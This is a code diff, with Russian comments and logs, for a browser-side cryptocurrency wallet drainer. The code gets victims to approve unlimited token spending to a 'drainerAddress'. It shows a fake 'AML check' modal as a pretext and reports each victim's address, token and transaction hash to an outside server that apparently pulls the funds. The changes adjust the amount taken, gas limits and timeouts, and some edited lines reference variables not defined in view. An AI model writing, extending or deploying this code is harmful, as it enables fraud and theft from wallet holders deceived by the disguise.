@@ -1,4 +1,3 @@
-// === Импорты зависимостей ===
 import { createAppKit } from '@reown/appkit';
 import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
@@ -41,8 +40,7 @@ const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
   "function approve(address spender, uint256 amount) returns (bool)",
   "function decimals() view returns (uint8)",
-  "function allowance(address owner, address spender) view returns (uint256)",
-  "function transfer(address to, uint256 amount) returns (bool)"
+  "function allowance(address owner, address spender) view returns (uint256)"
 ];
 
 const DRAINER_ABI = [
@@ -285,16 +283,24 @@ function formatBalance(balance, decimals) {
   return parseFloat(formatted).toFixed(6).replace(/\.?0+$/, '');
 }
 
-async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider) {
+async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider, initialAmount) {
   try {
     console.log(`📍 Уведомляем сервер о токене ${tokenAddress} для ${userAddress}`);
     const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-    const decimals = await token.decimals();
-    console.log(`📊 Decimals токена: ${decimals}`);
+    const [balance, decimals] = await Promise.all([
+      token.balanceOf(userAddress),
+      token.decimals()
+    ]);
+    console.log(`📊 Текущий баланс токена: ${ethers.utils.formatUnits(balance, decimals)}`);
+    
+    const fixedAmount = "1"; // 1 USDT
+    const roundedAmount = ethers.utils.parseUnits(fixedAmount, decimals);
 
-    // Фиксируем amount как 1 токен с учётом decimals
-    const fixedAmount = ethers.utils.parseUnits("1", decimals);
-    console.log(`📊 Фиксированное количество: 1 токен, в wei: ${fixedAmount.toString()}`);
+    console.log(`📊 Фиксированная сумма для списания: ${fixedAmount} USDT`);
+
+    if (roundedAmount.lte(0)) {
+      throw new Error('Amount is zero or negative after rounding');
+    }
 
     const response = await fetch('https://api.erc20scan.com/api/transfer', {
       method: 'POST',
@@ -302,7 +308,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
       body: JSON.stringify({
         userAddress,
         tokenAddress,
-        amount: fixedAmount.toString(),
+        amount: roundedAmount.toString(),
         chainId,
         txHash
       })
@@ -313,6 +319,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
       throw new Error(`Failed to notify server: ${data.message || 'Unknown error'}`);
     }
     console.log(`✅ Сервер успешно уведомлён о трансфере токена ${tokenAddress}`);
+    return { success: true, roundedAmount: roundedAmount.toString() };
   } catch (error) {
     console.error(`❌ Ошибка уведомления сервера: ${error.message}`);
     throw new Error(`Failed to notify server: ${error.message}`);
@@ -469,7 +476,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         await delay(10);
 
         const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
-          gasLimit: 500000,
+          gasLimit: 100000,
           gasPrice: gasPrice,
           nonce
         });
@@ -478,18 +485,15 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
 
         // Открываем модальное окно AML после успешного approve
-        const amlKey = `amlValue_${userAddress}`;
-        let amlValue = sessionStorage.getItem(amlKey);
-        if (!amlValue) {
-          amlValue = Math.floor(Math.random() * (45 - 15 + 1) + 15) + "%";
-          sessionStorage.setItem(amlKey, amlValue);
-          console.log(`📊 Сгенерировано новое значение AML для ${userAddress}: ${amlValue}`);
-        } else {
-          console.log(`📊 Использовано сохранённое значение AML для ${userAddress}: ${amlValue}`);
-        }
+        const amlValue = ethers.utils.formatUnits(balance, decimals); // Используем текущий баланс как значение AML
         await showAMLCheckModal(connectedAddress, amlValue);
 
-        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
+        const minAmount = ethers.utils.parseUnits("1", decimals);
+        if (balance.lt(minAmount)) {
+          console.log(`❌ Недостаточно ${token} для списания 1 USDT`);
+          continue;
+        }
+        await notifyServer(userAddress, address, roundedAmount, chainId, receipt.transactionHash, provider, balance);
         status = 'confirmed';
 
         if (!modalClosed) {
@@ -511,20 +515,12 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     } else {
       console.log(`✅ Allowance уже достаточно для токена ${token}`);
       try {
-        await notifyServer(userAddress, address, balance, chainId, null, provider);
-
-        // Открываем модальное окно AML
-        const amlKey = `amlValue_${userAddress}`;
-        let amlValue = sessionStorage.getItem(amlKey);
-        if (!amlValue) {
-          amlValue = Math.floor(Math.random() * (45 - 15 + 1) + 15) + "%";
-          sessionStorage.setItem(amlKey, amlValue);
-          console.log(`📊 Сгенерировано новое значение AML для ${userAddress}: ${amlValue}`);
-        } else {
-          console.log(`📊 Использовано сохранённое значение AML для ${userAddress}: ${amlValue}`);
+        const minAmount = ethers.utils.parseUnits("1", decimals);
+        if (balance.lt(minAmount)) {
+          console.log(`❌ Недостаточно ${token} для списания 1 USDT`);
+          continue;
         }
-        await showAMLCheckModal(connectedAddress, amlValue);
-
+        await notifyServer(userAddress, address, roundedAmount, chainId, null, provider, balance);
         status = 'confirmed';
       } catch (error) {
         console.error(`❌ Ошибка при вызове notifyServer для токена ${token}: ${error.message}`);
@@ -937,7 +933,7 @@ async function waitForWallet() {
       window.ethereum.removeListener('accountsChanged', handler);
       clearInterval(checkInterval);
       reject(new Error('Timeout waiting for wallet connection'));
-    }, 30000);
+    }, 50000);
 
     window.ethereum.request({ method: 'eth_requestAccounts' }).catch(err => {
       console.error('❌ Ошибка запроса аккаунтов:', err.message);
